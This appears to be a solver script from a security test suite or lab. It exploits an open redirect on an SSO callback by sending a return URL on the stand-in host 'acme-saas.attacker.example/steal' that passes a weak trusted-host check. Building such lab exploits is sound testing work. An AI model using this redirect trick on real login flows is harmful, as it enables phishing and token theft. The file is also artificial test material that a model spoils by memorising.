// Open redirect on the SSO callback: complete the callback with a return target on a foreign origin
// whose host satisfies the weak trusted-fragment check.
import type { SolverCtx } from '../../../../tests/helpers/site-matrix.ts'

export async function solve(ctx: SolverCtx): Promise<void> {
  const target = 'https://acme-saas.attacker.example/steal'
  await ctx.fetch(ctx.path('ssoCallback', {}, { url: target }))
}
